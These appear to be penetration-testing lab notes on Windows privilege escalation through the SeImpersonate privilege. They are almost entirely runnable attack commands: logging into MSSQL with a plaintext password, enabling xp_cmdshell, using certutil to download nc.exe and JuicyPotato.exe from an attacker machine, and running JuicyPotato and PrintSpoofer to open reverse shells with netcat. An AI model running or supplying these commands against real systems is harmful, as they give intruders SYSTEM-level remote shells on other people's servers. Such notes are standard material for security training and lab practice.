## SeImpersonate Example - JuicyPotato

**Connecting with MSSQLClient.py
```
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
- sql_dev:Str0ng_P@ssw0rd!

**Enabling xp_cmdshell
```
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

**Escalating Privileges Using JuicyPotato
```
sudo nc -lnvp 8443
xp_cmdshell c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 10.10.15.75 8443 -e cmd.exe" -t *
```
- Start listener on attack machine
- Transfer JuicyPotato.exe and nc.exe to target server
- JuicyPotato: https://github.com/ohpe/juicy-potato
- JuicyPotato does not work on Windows Server 2019 and Windows 10

## PrintSpoofer and RoguePotato
```
nc -lnvp 8443
xp_cmdshell "certutil.exe -urlcache -f http://10.10.15.75:8000/nc.exe C:\Users\Public\nc.exe"
xp_cmdshell "certutil.exe -urlcache -f http://10.10.15.75:8000/JuicyPotato.exe C:\Users\Public\JuicyPotato.exe"
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.75 8443 -e cmd"
```
- Use PrintSpoofer and RoguePotato for Windows Server 2019 and Windows 10
- Same concept as JuicyPotato

